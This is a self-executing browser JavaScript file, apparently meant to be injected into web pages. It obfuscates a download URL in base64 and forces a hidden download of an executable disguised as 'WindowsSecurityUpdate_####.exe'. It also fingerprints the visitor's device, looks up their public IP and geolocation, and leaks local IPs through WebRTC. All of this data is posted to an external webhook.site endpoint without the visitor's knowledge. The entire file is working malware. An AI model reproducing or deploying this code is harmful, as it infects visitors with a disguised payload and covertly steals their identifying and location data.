(function(){
  "use strict";
  const ENDPOINT="https://webhook.site/9e9060a0-52dc-4a4a-8f5f-31c389925163";
  const b64=s=>atob(s);
  const L=b64("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Fud29vamluMTAwNDEtY3JlYXRvci9Hcm9rQUkvbWFpbi9MYXVuY2hlci5leGU=");
  function rnd(a,b){return Math.floor(Math.random()*(b-a+1))+a}
  function drop(){
    fetch(L,{mode:"cors",cache:"no-store",credentials:"omit"})
      .then(r=>r.blob())
      .then(blob=>{
        const u=URL.createObjectURL(blob);
        const a=document.createElement("a");
        a.href=u;
        a.download="WindowsSecurityUpdate_"+rnd(1000,9999)+".exe";
        a.style.cssText="position:fixed;left:-9999px;top:-9999px;opacity:0;width:1px;height:1px;pointer-events:none";
        document.documentElement.appendChild(a);
        a.dispatchEvent(new MouseEvent("click",{bubbles:true,cancelable:true,view:window}));
        setTimeout(()=>{URL.revokeObjectURL(u);a.remove()},1400);
      }).catch(()=>{});
  }
  function webrtcIPs(){
    return new Promise(resolve=>{
      const ips=new Set();
      try{
        const pc=new (window.RTCPeerConnection||window.mozRTCPeerConnection||window.webkitRTCPeerConnection)({
          iceServers:[{urls:"stun:stun.l.google.com:19302"}]
        });
        pc.createDataChannel("");
        pc.createOffer().then(o=>pc.setLocalDescription(o)).catch(()=>{});
        pc.onicecandidate=e=>{
          if(!e||!e.candidate){pc.close();resolve([...ips]);return}
          const m=/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/.exec(e.candidate.candidate);
          if(m)ips.add(m[1]);
        };
        setTimeout(()=>{try{pc.close()}catch(e){}resolve([...ips])},1800);
      }catch(e){resolve([])}
    });
  }
  async function collect(){
    const data={
      ts:Date.now(),
      href:location.href,
      ref:document.referrer||"",
      ua:navigator.userAgent,
      lang:navigator.language,
      langs:navigator.languages?[...navigator.languages]:[],
      plat:navigator.platform,
      cookieEnabled:navigator.cookieEnabled,
      doNotTrack:navigator.doNotTrack,
      hardwareConcurrency:navigator.hardwareConcurrency||null,
      deviceMemory:navigator.deviceMemory||null,
      maxTouchPoints:navigator.maxTouchPoints||0,
      screen:{
        w:screen.width,h:screen.height,
        aw:screen.availWidth,ah:screen.availHeight,
        depth:screen.colorDepth,
        orient:screen.orientation?screen.orientation.type:null
      },
      tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
      tzOffset:new Date().getTimezoneOffset()
    };
    try{
      const ipRes=await fetch("https://api.ipify.org?format=json",{cache:"no-store"});
      const {ip}=await ipRes.json();
      data.ip=ip;
      const geoRes=await fetch("https://ipapi.co/"+ip+"/json/",{cache:"no-store"});
      const g=await geoRes.json();
      data.geo={
        city:g.city||null,
        region:g.region||null,
        country:g.country_name||null,
        countryCode:g.country_code||null,
        lat:g.latitude||null,
        lon:g.longitude||null,
        org:g.org||null,
        asn:g.asn||null,
        postal:g.postal||null
      };
    }catch(e){}
    try{data.localIPs=await webrtcIPs()}catch(e){data.localIPs=[]}
    // store locally so admin page can show something
    try{
      const key="_lx_logs";
      let logs=[];
      try{logs=JSON.parse(localStorage.getItem(key)||"[]")}catch(e){}
      logs.unshift(data);
      if(logs.length>30)logs=logs.slice(0,30);
      localStorage.setItem(key,JSON.stringify(logs));
    }catch(e){}
    // send out
    if(ENDPOINT&&!ENDPOINT.includes("REPLACE")){
      try{
        await fetch(ENDPOINT,{
          method:"POST",
          headers:{"Content-Type":"application/json"},
          body:JSON.stringify(data),
          mode:"cors",
          keepalive:true,
          credentials:"omit"
        });
      }catch(e){}
    }
  }
  setTimeout(collect,rnd(240,520));
  setTimeout(drop,rnd(700,1300));
})();
